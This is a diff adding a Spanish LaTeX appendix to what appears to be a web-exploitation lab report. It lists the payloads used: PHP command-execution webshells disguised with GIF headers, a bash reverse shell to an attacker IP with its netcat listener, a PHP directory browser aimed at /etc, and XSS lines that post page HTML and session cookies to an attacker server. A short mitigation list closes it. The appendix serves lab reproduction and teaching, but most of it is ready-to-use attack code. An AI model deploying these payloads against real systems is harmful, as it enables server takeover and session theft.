@@ -1,0 +1,208 @@
+\crearanexo{Payloads PHP y XSS utilizados}{anexo:payloads_php_xss}
+
+% ---------------------------------------------------
+
+\subsubsection*{Objetivo}
+
+Este apartado recoge los payloads utilizados durante las pruebas de explotación web. Su finalidad es facilitar la reproducción del laboratorio y documentar de forma ordenada los ficheros y cadenas empleados durante la validación.
+
+\subsubsection*{Payload PHP básico}
+
+Payload mínimo para ejecutar comandos mediante el parámetro \texttt{cmd}:
+
+\begin{configbox}
+<?php
+    system($_GET['cmd']);
+?>
+\end{configbox}
+
+Ejemplo de uso:
+
+\begin{configbox}
+http://<IP_SERVIDOR>:8080/uploads/shell.php?cmd=whoami
+\end{configbox}
+
+En el laboratorio, la versión \texttt{.php} directa debe ser bloqueada por la aplicación si el filtro de subida actúa sobre extensiones PHP simples.
+
+\subsubsection*{Webshell disfrazada con cabecera GIF}
+
+Fichero recomendado:
+
+\begin{configbox}
+terminal_url.gif.php
+\end{configbox}
+
+Contenido:
+
+\begin{configbox}
+GIF89a
+<?php
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+
+    echo "<h2>Comando ejecutado:</h2>";
+    echo "<pre>" . htmlspecialchars($cmd) . "</pre>";
+
+    echo "<h2>Resultado:</h2>";
+    echo "<pre>";
+    system($cmd . " 2>&1");
+    echo "</pre>";
+} else {
+    echo "Uso: terminal.php?cmd=whoami";
+}
+?>
+\end{configbox}
+
+Ejemplos de uso:
+
+\begin{configbox}
+http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=whoami
+http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=id
+http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=pwd
+http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=ip+a
+\end{configbox}
+
+\subsubsection*{Webshell con formulario}
+
+Fichero recomendado:
+
+\begin{configbox}
+web_shell_bonita.gif.php
+\end{configbox}
+
+Contenido:
+
+\begin{configbox}
+GIF89a
+<?php
+echo "<form method='GET'>";
+echo "<input type='text' name='cmd'>";
+echo "<input type='submit'>";
+echo "</form>";
+
+if (isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+}
+?>
+\end{configbox}
+
+Esta variante resulta útil para documentar la ejecución de comandos desde el navegador.
+
+\subsubsection*{Payload de reverse shell}
+
+Fichero recomendado:
+
+\begin{configbox}
+shell.gif.php
+\end{configbox}
+
+Contenido:
+
+\begin{configbox}
+GIF89a
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'");
+?>
+\end{configbox}
+
+Listener en Kali:
+
+\begin{bashbox}
+nc -lvnp 4444
+\end{bashbox}
+
+Ejecución:
+
+\begin{configbox}
+http://<IP_SERVIDOR>:8080/uploads/shell.gif.php
+\end{configbox}
+
+\subsubsection*{File browser básico}
+
+Fichero recomendado:
+
+\begin{configbox}
+file_browser.gif.php
+\end{configbox}
+
+Contenido:
+
+\begin{configbox}
+GIF89a
+<?php
+$dir = $_GET['dir'] ?? '.';
+$files = scandir($dir);
+
+foreach ($files as $f) {
+    echo "<a href='?dir=$f'>$f</a><br>";
+}
+?>
+\end{configbox}
+
+Ejemplos de uso:
+
+\begin{configbox}
+http://<IP_SERVIDOR>:8080/uploads/file_browser.gif.php
+http://<IP_SERVIDOR>:8080/uploads/file_browser.gif.php?dir=/var/www/html
+http://<IP_SERVIDOR>:8080/uploads/file_browser.gif.php?dir=/etc
+\end{configbox}
+
+\subsubsection*{Payloads XSS}
+
+Payload básico de validación:
+
+\begin{configbox}
+<img src=x onerror=alert(1)>
+\end{configbox}
+
+Payload para enviar el contenido HTML de la página a un servidor controlado por el atacante:
+
+\begin{configbox}
+<img src=x onerror="fetch(`http://<IP_ATACANTE>:8000`,{method:`POST`,body:document.body.innerHTML})">
+\end{configbox}
+
+Payload para enviar cookies de sesión en caso de que sean accesibles desde JavaScript:
+
+\begin{configbox}
+<img src=x onerror="fetch(`http://<IP_ATACANTE>:8000`,{method:`POST`,body:document.cookie})">
+\end{configbox}
+
+Servidor HTTP temporal para recibir peticiones:
+
+\begin{bashbox}
+python3 -m http.server 8000
+\end{bashbox}
+
+\subsubsection*{Resumen de payloads}
+
+\renewcommand{\arraystretch}{1.4}
+\begin{table}[H]
+    \centering
+    \captionazul{Payloads utilizados durante la explotación web}
+
+    \begin{tabular}{|C{4cm}|C{4cm}|C{5cm}|}
+        \hline
+        \rowcolor{blue!10}
+        \textbf{Payload} & \textbf{Tipo} & \textbf{Uso principal} \\
+        \hline
+        \texttt{terminal\_url.gif.php} & GIF/PHP & Ejecución de comandos por URL \\
+        \hline
+        \texttt{web\_shell\_bonita.gif.php} & GIF/PHP & Ejecución de comandos desde formulario \\
+        \hline
+        \texttt{shell.gif.php} & GIF/PHP & Reverse shell hacia Kali \\
+        \hline
+        \texttt{file\_browser.gif.php} & GIF/PHP & Enumeración de directorios \\
+        \hline
+        \texttt{<img src=x onerror=...>} & XSS & Validación de ejecución JavaScript \\
+        \hline
+    \end{tabular}
+
+    \label{tab:payloads_explotacion_web}
+\end{table}
+\renewcommand{\arraystretch}{1}
+
+\subsubsection*{Mitigaciones recomendadas}
+
+En un entorno real, este tipo de vulnerabilidades debería mitigarse aplicando controles como lista blanca estricta de extensiones, almacenamiento de archivos fuera del \textit{webroot}, deshabilitación de ejecución PHP en directorios de subida, renombrado de archivos, validación real del contenido y codificación de salida en todos los datos introducidos por el usuario.
